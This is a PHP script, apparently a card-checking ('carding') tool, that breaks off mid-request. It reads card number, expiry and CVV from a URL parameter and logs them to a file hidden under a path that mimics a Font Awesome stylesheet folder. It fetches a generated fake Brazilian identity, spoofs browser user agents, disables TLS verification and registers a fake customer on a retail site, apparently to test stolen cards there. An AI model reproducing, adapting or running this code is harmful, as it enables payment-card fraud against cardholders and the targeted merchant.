<?php
session_start();
error_reporting(0);
ignore_user_abort();

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die('{"status":"die","lista":"null","message":"Cartao invalido, teste nao iniciado.","valor":"R$2,49":"}');
}



$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

if ($mes[0] == '0') {
    $mes = $mes[1];
}

if (strlen($ano) == 2){
  $ano = "20$ano";
}

if(strpos(file_get_contents("use.fontawesome.com/releases/v5.5.0/css/reteste.txt"), "$cc") !== false){

die("<b><span style='color:#00FF00'><span class='badge badge-dark'style='color:#00FF00'>Reteste</span><br> $lista <br>Retorno: Matriz Pôdi Hein <br>
 </span><br></b>");}


$file = fopen("use.fontawesome.com/releases/v5.5.0/css/reteste.txt", "a");

fwrite($file, "$cc|$mes|$ano|000\n");

fclose($file);


if ($cc == NULL || $mes == NULL || $ano == NULL || $cvv == NULL) {
die('{"status":"die","lista":"null","message":"Cartao invalido, teste nao iniciado.","valor":"R$2,49":""}');
}

#######use em alguns casos######

$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);

#######use em alguns casos######


$cookieFile = "cookie.txt";

if (file_exists($cookieFile)) {
    unlink($cookieFile);
}

$handle = fopen($cookieFile, 'w');
fclose($handle);

###############################################
######use em payload que aparece bandeira######

function identifyCreditCard($creditCardNumber)
{
    $cardPatterns = array(
        'visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'mastercard' => '/^5[1-5][0-9]{14}$/',
        'amex' => '/^3[47][0-9]{13}$/',
        'elo' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
    );

    foreach ($cardPatterns as $card => $pattern) {
        if (preg_match($pattern, $creditCardNumber)) {
            return $card;
        }
    }

    return 'Desconhecida';
}

$creditCardNumber = "$cc";
$bandeira = identifyCreditCard($creditCardNumber);


######use em payload que aparece bandeira######
###############################################





###############################################
###############GERAR USER AGENT################
function generateUserAgent() {

    $platforms = [

        'Windows' => [
            'Windows NT 10.0; Win64; x64',
            'Windows NT 10.0; WOW64',
            'Windows NT 6.3; Win64; x64',
            'Windows NT 6.3; WOW64',
            'Windows NT 6.2; Win64; x64',
            'Windows NT 6.2; WOW64',
            'Windows NT 6.1',
            'Windows NT 6.0',
            'Windows NT 5.1',
            'Windows NT 5.0',
        ],
        'Mac' => [
            'Macintosh; Intel Mac OS X 10_14_5',
            'Macintosh; Intel Mac OS X 10_14_0',
            'Macintosh; Intel Mac OS X 10_13_6',
            'Macintosh; Intel Mac OS X 10_13_3',
            'Macintosh; Intel Mac OS X 10_12_6',
            'Macintosh; Intel Mac OS X 10_11_6',
            'Macintosh; Intel Mac OS X 10_10_5',
        ],
        'Linux' => [
            'X11; Linux x86_64',
            'X11; Ubuntu; Linux x86_64',
            'X11; Fedora; Linux x86_64',
            'X11; CentOS; Linux x86_64',
            'X11; Debian; Linux x86_64',
            'X11; Arch Linux; Linux x86_64',
        ],
        'Android' => [
            'Linux; Android 10',
            'Linux; Android 9',
            'Linux; Android 8',
            'Linux; Android 7',
            'Linux; Android 6',
            'Linux; Android 5',
        ]
    ];

    $randomPlatform = array_rand($platforms);
    $randomUserAgent = $platforms[$randomPlatform][array_rand($platforms[$randomPlatform])];
    $rand = random_int(1000, 9999);
    $rand1 = random_int(100, 999);
    $userAgent = 'Mozilla/5.0 (' . $randomUserAgent . ') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.' . $rand . '.'.$rand1.' Safari/537.36';

    return $userAgent;
}

$userAgent = generateUserAgent();

###############GERAR USER AGENT################
###############################################



$urlpedido = array(
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13216F3GHJMN5694GADGA1321/374351",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13216F3GHJMN560YGDAGA1531/602285",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321TL17565FATL17565FA/183649",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321TL17565FAMF48513AGAD/556856",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321TL17565FAG5RYWE21861G/643725",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321TL17565FA1LGDAG15132GQA/402349",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321TL17565FA0YGDAGA1531/631519",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132173NN15246F3GHJMN56/295523",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132173NN152473NN1524/581095",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132173NN1524E16956135/131769",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132173NN1524MF48513AGAD/200270",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132173NN1524G5RYWE21861G/441276",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132173NN15241LGDAG15132GQA/195086",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132173NN15240YGDAGA1531/405458",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132173NN15240YGDAGA1531/405458",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321E1695613573NN1524/191514",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321E16956135E16956135/521458",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321E16956135G5RYWE21861G/555488",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321E169561351LGDAG15132GQA/224432",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321E1695613594GADGA1321/178216",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321E169561350YGDAGA1531/630135",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321MF48513AGAD856HUWER097J/284926",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321MF48513AGAD6F3GHJMN56/223206",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321MF48513AGADTL17565FA/589208",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321MF48513AGAD73NN1524/608815",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321MF48513AGADMF48513AGAD/255579",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321MF48513AGADG5RYWE21861G/276400",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321MF48513AGAD1LGDAG15132GQA/491439",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321MF48513AGAD0YGDAGA1531/367088",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321G5RYWE21861G856HUWER097J/651319",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321G5RYWE21861G6F3GHJMN56/439259",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321G5RYWE21861GTL17565FA/112983",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321G5RYWE21861GTL17565FA/112983",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321G5RYWE21861GG5RYWE21861G/339676",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321G5RYWE21861G1LGDAG15132GQA/599523",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321G5RYWE21861G94GADGA1321/257915",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA1321G5RYWE21861G0YGDAGA1531/476077",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13211LGDAG15132GQA856HUWER097J/332374",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13211LGDAG15132GQA6F3GHJMN56/587428",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13211LGDAG15132GQATL17565FA/354409",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13211LGDAG15132GQAE16956135/609848",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13211LGDAG15132GQAMF48513AGAD/146798",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13211LGDAG15132GQA1LGDAG15132GQA/223326",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13211LGDAG15132GQA94GADGA1321/352622",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13211LGDAG15132GQA0YGDAGA1531/645627",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132194GADGA1321856HUWER097J/329530",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132194GADGA13216F3GHJMN56/639650",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132194GADGA13216F3GHJMN56/639650",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132194GADGA1321E16956135/435041",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132194GADGA1321MF48513AGAD/579331",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132194GADGA1321G5RYWE21861G/580368",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA132194GADGA13210YGDAGA1531/224062",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13210YGDAGA15316F3GHJMN56/559671",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13210YGDAGA1531TL17565FA/360911",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13210YGDAGA153173NN1524/418723",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13210YGDAGA1531E16956135/283923",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13210YGDAGA1531MF48513AGAD/387594",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13210YGDAGA1531G5RYWE21861G/287445",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13210YGDAGA1531G5RYWE21861G/287445",
"TL17565FATL17565FA73NN15246F3GHJMN5694GADGA13210YGDAGA1531G5RYWE21861G/287445",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531856HUWER097J6F3GHJMN56/426606",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531856HUWER097J73NN1524/537383",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531856HUWER097JE16956135/288708",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531856HUWER097JG5RYWE21861G/448788",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531856HUWER097J1LGDAG15132GQA/171096",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531856HUWER097J94GADGA1321/494990",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA15316F3GHJMN566F3GHJMN56/519815",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA15316F3GHJMN5673NN1524/438298",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA15316F3GHJMN56E16956135/523140",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA15316F3GHJMN56MF48513AGAD/208701",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA15316F3GHJMN56G5RYWE21861G/433634",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA15316F3GHJMN561LGDAG15132GQA/377979",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA15316F3GHJMN5694GADGA1321/581404",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA15316F3GHJMN560YGDAGA1531/213861",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531TL17565FA856HUWER097J/491828",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531TL17565FA6F3GHJMN56/356876",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531TL17565FAE16956135/406607",
"TL17565FATL17565FA73NN15246F3GHJMN560YGDAGA1531TL17565FA1LGDAG15132GQA/659236",
"TL17565FATL17565FA73NN1524TL17565FAE16956135856HUWER097J6F3GHJMN56/192851",
"TL17565FATL17565FA73NN1524TL17565FAE16956135856HUWER097JMF48513AGAD/131875",
"TL17565FATL17565FA73NN1524TL17565FAE16956135TL17565FA73NN1524/278969",
"TL17565FATL17565FA73NN1524TL17565FAE1695613573NN15246F3GHJMN56/125685",
"TL17565FATL17565FA73NN1524TL17565FAE16956135E169561356F3GHJMN56/438336",
"TL17565FATL17565FA73NN1524TL17565FAE16956135E1695613573NN1524/237655",
"TL17565FATL17565FA73NN1524TL17565FAE16956135E1695613573NN1524/237655",
"TL17565FATL17565FA73NN1524TL17565FAE16956135E1695613594GADGA1321/270007",
"TL17565FATL17565FA73NN1524TL17565FAE16956135MF48513AGADMF48513AGAD/655311",
"TL17565FATL17565FA73NN1524TL17565FAE16956135G5RYWE21861G73NN1524/414637",
"TL17565FATL17565FA73NN1524TL17565FAE16956135G5RYWE21861GMF48513AGAD/187770",
"TL17565FATL17565FA73NN1524TL17565FAE16956135G5RYWE21861G1LGDAG15132GQA/350277",
"TL17565FATL17565FA73NN1524TL17565FAE16956135G5RYWE21861G0YGDAGA1531/515683",
"TL17565FATL17565FA73NN1524TL17565FAE16956135G5RYWE21861G0YGDAGA1531/515683",
"TL17565FATL17565FA73NN1524TL17565FAE169561351LGDAG15132GQATL17565FA/176365",
"TL17565FATL17565FA73NN1524TL17565FAE169561351LGDAG15132GQAMF48513AGAD/384888",
"TL17565FATL17565FA73NN1524TL17565FAE169561351LGDAG15132GQAG5RYWE21861G/188670",
"TL17565FATL17565FA73NN1524TL17565FAE169561351LGDAG15132GQA0YGDAGA1531/152342",
"TL17565FATL17565FA73NN1524TL17565FAE1695613594GADGA13216F3GHJMN56/351669",
"TL17565FATL17565FA73NN1524TL17565FAE1695613594GADGA1321G5RYWE21861G/132512",
"TL17565FATL17565FA73NN1524TL17565FAE1695613594GADGA132194GADGA1321/399260",
"TL17565FATL17565FA73NN1524TL17565FAE1695613594GADGA13210YGDAGA1531/388735",
"TL17565FATL17565FA73NN1524TL17565FAE169561350YGDAGA15316F3GHJMN56/643662",
"TL17565FATL17565FA73NN1524TL17565FAE169561350YGDAGA1531TL17565FA/233643",
"TL17565FATL17565FA73NN1524TL17565FAE169561350YGDAGA1531E16956135/450945",
"TL17565FATL17565FA73NN1524TL17565FAE169561350YGDAGA15311LGDAG15132GQA/530417",
"TL17565FATL17565FA73NN1524TL17565FAE169561350YGDAGA153194GADGA1321/343141",
"TL17565FATL17565FA73NN1524TL17565FAE169561350YGDAGA15310YGDAGA1531/156310",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD856HUWER097J6F3GHJMN56/436843",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD856HUWER097J73NN1524/264077",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD856HUWER097J0YGDAGA1531/221331",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD6F3GHJMN566F3GHJMN56/619385",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD6F3GHJMN56TL17565FA/242838",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD6F3GHJMN5673NN1524/123381",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD6F3GHJMN56MF48513AGAD/306142",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD6F3GHJMN56G5RYWE21861G/416001",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD6F3GHJMN5673NN1524/123381",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADTL17565FA1LGDAG15132GQA/451114",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD73NN152473NN1524/130417",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD73NN1524E16956135/619172",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD73NN1524MF48513AGAD/259712",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD73NN1524MF48513AGAD/259712",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADE169561356F3GHJMN56/415168",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADE169561350YGDAGA1531/169942",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADMF48513AGAD6F3GHJMN56/429641",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADMF48513AGAD73NN1524/439264",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADMF48513AGADG5RYWE21861G/634597",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADG5RYWE21861G6F3GHJMN56/628994",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADG5RYWE21861G73NN1524/114569",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADG5RYWE21861GMF48513AGAD/234844",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADG5RYWE21861GG5RYWE21861G/419550",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADG5RYWE21861G1LGDAG15132GQA/651333",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGADG5RYWE21861G0YGDAGA1531/558270",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD1LGDAG15132GQA6F3GHJMN56/342430",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD1LGDAG15132GQA6F3GHJMN56/342430",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD1LGDAG15132GQAG5RYWE21861G/416235",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD1LGDAG15132GQA1LGDAG15132GQA/122092",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD94GADGA1321856HUWER097J/156859",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD94GADGA1321856HUWER097J/156859",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD94GADGA1321E16956135/171296",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD94GADGA1321MF48513AGAD/365703",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD0YGDAGA1531856HUWER097J/418328",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD0YGDAGA1531TL17565FA/236562",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD0YGDAGA1531TL17565FA/236562",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD0YGDAGA1531TL17565FA/236562",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD0YGDAGA153194GADGA1321/441354",
"TL17565FATL17565FA73NN1524TL17565FAMF48513AGAD0YGDAGA15310YGDAGA1531/564021",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G856HUWER097J6F3GHJMN56/254937",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G856HUWER097JE16956135/659845",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G856HUWER097JE16956135/659845",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G856HUWER097J1LGDAG15132GQA/513667",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G6F3GHJMN56856HUWER097J/581851",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G6F3GHJMN5673NN1524/299639",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G856HUWER097J1LGDAG15132GQA/513667",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G6F3GHJMN5694GADGA1321/559830",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G6F3GHJMN5694GADGA1321/559830",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GTL17565FA1LGDAG15132GQA/165828",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G73NN1524856HUWER097J/610947",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G73NN15246F3GHJMN56/472468",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G73NN15246F3GHJMN56/472468",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GE169561356F3GHJMN56/434775",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G73NN1524856HUWER097J/610947",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GE16956135E16956135/512688",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GE1695613594GADGA1321/155826",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GMF48513AGAD6F3GHJMN56/195587",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GMF48513AGAD73NN1524/286246",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GMF48513AGADE16956135/488522",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GMF48513AGADMF48513AGAD/498471",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GMF48513AGAD94GADGA1321/410245",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GMF48513AGAD0YGDAGA1531/412737",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GG5RYWE21861G856HUWER097J/431556",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GG5RYWE21861G6F3GHJMN56/288415",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GMF48513AGAD0YGDAGA1531/412737",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GG5RYWE21861G1LGDAG15132GQA/504471",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GG5RYWE21861G1LGDAG15132GQA/504471",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861GG5RYWE21861G6F3GHJMN56/288415",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G1LGDAG15132GQA6F3GHJMN56/511176",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G1LGDAG15132GQA6F3GHJMN56/511176",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G1LGDAG15132GQA94GADGA1321/597520",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA13216F3GHJMN56/322119",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA1321TL17565FA/515885",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA132173NN1524/589744",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA13216F3GHJMN56/322119",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA1321TL17565FA/515885",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA1321TL17565FA/515885",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA132173NN1524/589744",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA132173NN1524/589744",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA132173NN1524/589744",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA132173NN1524/589744",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA132173NN1524/589744",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA132173NN1524/589744",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA132173NN1524/589744",
"TL17565FATL17565FA73NN1524TL17565FAG5RYWE21861G94GADGA132173NN1524/589744",
);

$indice_atual = isset($_SESSION['indice_atual']) ? $_SESSION['indice_atual'] : 0;
$urltoken_atual = $urlpedido[$indice_atual];

// Atualizar o índice atual para a próxima posição
$indice_atual++;
if ($indice_atual >= count($urlpedido)) {
    $indice_atual = 0; // Volte ao início se chegou ao fim da array
}

// Salvar o índice atual na variável de sessão
$_SESSION['indice_atual'] = $indice_atual;


$gate = getStr($urltoken_atual, '/','/' , 1);








$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);
$nome = getStr($dados, '"nome":"','"' , 1);
$cpf = getStr($dados, '"cpf":"','"' , 1);
$celular = getStr($dados, '"celular":"','"' , 1);
$email = getStr($dados, '"email":"','"' , 1);
$senha = getStr($dados, '"senha":"','"' , 1);

/////////////////////////////////////////////////////////////////////////////////////////

//////////////////////  ////////////////////// 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/cadastro");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Upgrade-Insecure-Requests: 1',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'dnt: 1',
'X-Requested-With: mark.via.gp',
'Sec-Fetch-Site: none',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://easytdr.com.br/login',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
$registroget = curl_exec($ch);


###########REGISTRO

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/posts/cliente");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
//curl_setopt($curl, CURLOPT_PROXY, $proxy); // Adiciona o proxy
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: easytdr.com.br',
'Connection: keep-alive',
'Accept: text/html, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://easytdr.com.br',
'Referer: https://easytdr.com.br/cadastro',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'salvar_cliente=true&idcliente=&idpessoafisica=&idpessoajuridica=&idendereco=&idenderecocliente=&pessoa=fisica&atacado=0&nome=Kleber&sobrenome=Oliveira&cpf='.$cpf.'&rg=&inscricaoprodutorrural=&crm=&sexchb=M&sexo=M&dia=23&mes=07&ano=2002&razaosocial=&nomefantasia=&cnpj=&ie=&apelido=&responsavel=&ddd1=61&telefone1=969699969&ddd2=&telefone2=&email='.$nome.'w6fo5661%40gmail.com&email_confirm=&senha=kleber155&senha_confirm=kleber155&cep1=&cep2=&tipoendereco=&outro=&logradouro=&numero=&complemento=&bairro=&cidade=&uf=');
$registro = curl_exec($ch);


##########ITEM

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://easytdr.com.br/mediaplus/controller/cpcontroller");
curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
